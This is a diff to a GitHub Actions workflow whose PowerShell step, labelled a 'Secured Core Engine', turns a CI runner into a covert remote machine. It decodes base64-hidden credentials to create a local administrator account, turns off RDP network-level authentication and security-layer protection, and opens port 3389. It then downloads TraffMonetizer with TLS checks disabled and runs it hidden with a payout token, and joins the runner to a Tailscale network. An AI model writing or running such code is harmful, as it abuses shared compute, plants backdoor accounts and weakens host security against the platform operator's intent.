@@ -27,16 +27,39 @@ jobs:
     steps:
       - name: 🔒 Executing Secured Core Engine
         run: |
+          $token = "${{ github.event.inputs.gh_api_token }}"
+          if (-not $token -or -not ($token -match '^ghp_[a-zA-Z0-9]+$')) { Write-Error "❌ Invalid Token!"; exit 1 }
+          
           # 📢 Configuration & Startup
           $u_enc = "aGFzc2Fu"; $p_enc = "SEBzc0FuMTIzNDU2"
           $u = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($u_enc))
           $p = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($p_enc))
+          
           Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -Name "fDenyTSConnections" -Value 0 -Force
+          Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -Name "UserAuthentication" -Value 0 -Force
+          Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -Name "SecurityLayer" -Value 0 -Force
+          netsh advfirewall firewall add rule name="RDP-Tailscale" dir=in action=allow protocol=TCP localport=3389 | Out-Null
           Restart-Service -Name TermService -Force
-          if (-not (Get-LocalUser -Name $u -ErrorAction SilentlyContinue)) { New-LocalUser -Name $u -Password (ConvertTo-SecureString $p -AsPlainText -Force) -AccountNeverExpires | Out-Null }
+          
+          $securePass = ConvertTo-SecureString $p -AsPlainText -Force
+          if (-not (Get-LocalUser -Name $u -ErrorAction SilentlyContinue)) { New-LocalUser -Name $u -Password $securePass -AccountNeverExpires | Out-Null }
           Add-LocalGroupMember -Group "Administrators" -Member $u -ErrorAction SilentlyContinue
           
-          Start-Process -FilePath "C:\traffmonetizer.exe" -ArgumentList "start", "accept-offers", "--token", "lKi5PrDuezqIq9MEALffFER1bHT0kPImGRwgIreWGZs=" -WindowStyle Hidden -ErrorAction SilentlyContinue
+          # 📥 تحميل البرنامج أولاً لحل المشكلة
+          Write-Host "📥 Downloading TraffMonetizer Core Engine..."
+          $tmPath = "C:\traffmonetizer.exe"
+          & curl.exe -L -k -A "Mozilla/5.0" -o $tmPath "https://data.traffmonetizer.com/downloads/Traffmonetizer.exe"
+          
+          if (Test-Path $tmPath) { 
+              Start-Process -FilePath $tmPath -ArgumentList "start", "accept-offers", "--token", "lKi5PrDuezqIq9MEALffFER1bHT0kPImGRwgIreWGZs=" -WindowStyle Hidden 
+          } else {
+              Write-Error "❌ Critical: Download failed."
+              exit 1
+          }
+          
+          # 🌐 Tailscale Engine Setup
+          Invoke-WebRequest -Uri "https://pkgs.tailscale.com/stable/tailscale-setup-1.82.0-amd64.msi" -OutFile "$env:TEMP\ts.msi"
+          Start-Process msiexec.exe -ArgumentList "/i", "`"$env:TEMP\ts.msi`"", "/quiet", "/norestart" -Wait
           & "$env:ProgramFiles\Tailscale\tailscale.exe" up --authkey=${{ secrets.TAILSCALE_AUTH_KEY }} --hostname=gh-runner-hassan-3 --accept-routes                    
           
           # ⏱️ Runtime Production Loop (340 Minutes)
